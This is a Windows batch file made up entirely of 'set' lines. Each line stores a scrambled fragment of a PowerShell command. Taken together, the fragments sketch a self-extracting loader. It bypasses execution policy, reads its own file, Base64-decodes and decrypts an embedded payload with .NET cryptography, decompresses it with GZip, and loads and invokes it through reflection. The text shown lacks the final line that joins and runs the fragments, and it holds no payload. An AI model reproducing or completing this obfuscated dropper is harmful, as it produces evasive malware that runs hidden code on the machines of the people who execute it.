@echo off
set "EtgTbZCDqZ=ke($"
set "fbNMhHJyPV=]::N"
set "rWUJOdyPKv=CFxo"
set "NGbWPfwBZV=tsWi"
set "VUSUhruWFd=.Mem"
set "JEbqRkHseu=, $H"
set "vhsxwZzMCa=icin"
set "VSmOAzvFnJ=rans"
set "MLqRtuCwqC=inM."
set "tfGtuAHsrr=ion."
set "pIlKPqqTzM=bypa"
set "FWzXzFyXPI=jj.I"
set "mqlbSERRQD=Obje"
set "PxkDmfBuMu=th('"
set "uLZvOVqtTg=::('"
set "VyWoznBOXj===')"
set "iglHwKtZvF=St ="
set "NZUSgHCGrn=ose("
set "XMprvVdzIr=1..-"
set "YxRltMzgoc=se()"
set "nPHfZheTGC=bSGn"
set "nMGRyqIgWh=-1.."
set "YgaoyflmFw=oArr"
set "QlYHegxAXE=fore"
set "RUDjuMuXDW=$HKT"
set "fOcPRSqWNa=$XFv"
set "DqLquvDBpw=Star"
set "CduiIAROgP== $J"
set "JAwsIFKcyj=j = "
set "MyAXMDgGMA=RMjj"
set "hoGAePfGCn='0Pg"
set "jdhhXsAwFD='[-1"
set "mdgIvJJyKJ=F'[-"
set "KpdojiaYBw=ert]"
set "emNyJYQdrk=ispo"
set "qMkPfYtQat=3); "
set "tZEzvihfyE='txe"
set "SuYSkfJtco=)) {"
set "yHwrKEWFkC=tS46"
set "iACnAYTKlV=trea"
set "fUWUVmdZup=();$"
set "jnYbTnWsSN=CY ="
set "RaVQWfoolq=lHuc"
set "hiioaElwbv=.Cry"
set "BHAPWUZUsQ=yTo("
set "pDmTlhjSwG=-Obj"
set "jQIrlFvUZH=HKTS"
set "iichhCwXtB=();$"
set "YdQFapBFBa=;$XF"
set "reVaLmYzHW=File"
set "mdFFgEJXvQ=('%*'"
set "yFgyjcyHak=y.Cr"
set "LpyHuKWuqV=ptog"
set "ZsdYHaUtGu=ment"
set "wKIdnumzSF=ck($"
set "EcvjdYDkpm=embl"
set "qlreQSFjhy=ss -"
set "UKvgFmRRkj=);$j"
set "EGeoTCVPMm=[]] "
set "XPdLGGaePL=em.I"
set "NPJEnmRrIo=form"
set "bVYZZyMRBf=HucB"
set "WgPSnZhZCu=S46e"
set "HqbFaOQIIV=ose("
set "YQgKtjKQXd=);$J"
set "qntFxrGMlG=$jRA"
set "ErRRfaZnrc=Disp"
set "mDBcQlLAwE=zHhH"
set "bLDjSeVPJY=HKTS"
set "IRpRTShmDN=t Sy"
set "bVPRMSutDK=nX ="
set "ZobGekaNVr=dj0C"
set "GrHVHLcYEu=.Con"
set "oogqKpvUxA=ring"
set "nDRxxLVBcg=CY);"
set "XJqiimOFzO=-joi"
set "VkCWyEGRch=RACY"
set "TaUuLHsPMb=tem."
set "QdQOvWousl=RmAx"
set "hGfAeZuteK=Comp"
set "AbKqHwbtKO= '')"
set "pZAEGtranE=.Mod"
set "vzfMBKFEbj=[Env"
set "YUhCqaoEEA=n ''"
set "xmZVZaYznH=FDaL"
set "MEWZvAxdYh=Bmor"
set "PWEUNwrUuv=BC;$"
set "CQKhwQUSku=-nop"
set "hPkqGHhFHH=).Sp"
set "vXozjwxwIA=7;$J"
set "YycAPQRwqu=OQt."
set "omwPHbWVwg=New-"
set "AxzQvYxWwk=Secu"
set "RnGaeULOCt=; };"
set "aFtltAjdqQ=k; }"
set "CaAkblQjnX=yste"
set "APqzfavliK=rtS4"
set "mDtofQFXtt=inM "
set "HoMChDWHYc=RMjj"
set "gkhhivdAun=am;$"
set "fzsKQmIPTs=rity"
set "iIrOfttpTj=pres"
set "oZZkCJEewu=M.Su"
set "GsrVMDoDzV=106u"
set "SVeDKLXyRO=oin "
set "EUqjlVgDxz=comp"
set "iGoEbOVhHR=)))"
set "OuOffrvjDy=B = "
set "OXRNvXfJJn=em.C"
set "oQnWZGviVq=.IO."
set "nXHdmCuWMk=ddin"
set "xxaKRqBEhB=y]::"
set "unYMBvsFuj=St);"
set "WxJhhvdgIk=;$FD"
set "sumMVYJPkE=Obje"
set "kKUvRvETkS=);$l"
set "vGOZsQvsjq=m.Re"
set "LmuerClgdE=.Sec"
set "HFxnngRyPl=n ''"
set "WUNdheOiqW=rity"
set "XQokfUxOLX=oint"
set "niFxOGfWpJ=-ep "
set "oosvLeKDWo=OOQt"
set "lyzZFXwrQU= = ["
set "WxLuuFVGIt=join"
set "dyREQWAtKE=.Key"
set "AzOstLYZfW=.Cop"
set "HkXpxUWKmS=pose"
set "qAoDVEwyIl=KTSt"
set "wENnquvice=$lHu"
set "ZPvRrLLzBZ=X) {"
set "NNSizhYLFz= '')"
set "MTAPXDrwnb=saBm"
set "zDsaZiVSbA=.Com"
set "WdoQatryre=Secu"
set "jdVOHHtRlo=6esa"
set "VkOENyLmlG=V = "
set "hknflYDCCS=iron"
set "KIumBGDyaB=stem"
set "HtopGQIvAG=esaB"
set "WdLdooZBrP=onve"
set "WSQsswtGbs=.Dis"
set "vfIUgFzbvL= = N"
set "VpQLrhbENp=ptor"
set "QsvfgFynUp=AHKX"
set "dRtodWSqdE=16] "
set "lIKjEawfiT=pose"
set "aZOSnglKue=daeR"
set "ZNcFcwkWVL=PxEW"
set "MOiNFRMtLg=stem"
set "tfyxQYzvPe=stem"
set "wYvGdvJREy=)($I"
set "jTussVGNxt=CY.T"
set "HOPWUMRryw=ing("
set "ComGNhoXTn=ect "
set "XmgvygrUsJ= = $"
set "mELleZvsCY=ress"
set "bWRAjEyEmq=ct S"
set "MTsUSwVooX=($ic"
set "IVEjYnNHxU=$jRA"
set "mrSREnCnps=lBlo"
set "BkZHiMyzKJ=and "
set "TTCuooXlJt=tryP"
set "kQIsCPmqkP=flec"
set "ejfsSnWmQW=6] -"
set "QhFDCVwraO=]::("
set "JtQEJOnQmX=sbkQ"
set "RHnIkuutGR=.Len"
set "mBPqNyNTTG=]::C"
set "axbRdYAGNy=g = "
set "BHRpBxEDqG=Conv"
set "OmCScKOlzX=yste"
set "KbVbXjDTbQ=[-1."
set "byZhYjDGxk=s75K"
set "nnajDpvgZw=JRMj"
set "HajZOdFBkS=grap"
set "QnLmWmsIOj=Disp"
set "aXhogvhczw=:: '"
set "LYFwNtlLlo=1] -"
set "cKmASOLAps=.Cry"
set "cDEyzHzlmB=ewLi"
set "CIOBswAWWZ=.GZi"
set "NlSgslyKtD=('%~f0'"
set "UwYLAuJmmT=RMjj"
set "fWAjeNFGZZ=gnir"
set "UiUgVfMiHD=-4] "
set "yZYPJtYycE=]::("
set "TypnCAaUUh=('da"
set "TPRGechxLT=);$J"
set "JdOFLojyME=TllA"
set "htSuEsrvmq=Mode"
set "UNmhYzUPvI=$FDa"
set "YvbylflJVd= [Sy"
set "AMtWEVIIyW=vert"
set "wWwhpodCuK=d;$J"
set "InBEOOVaQv=y.Ci"
set "bleiqPlZYH=y.Pa"
set "TCmdIkPXHi=ddin"
set "oGncGIgevu=L4Yi"
set "QchSatuyEW=Invo"
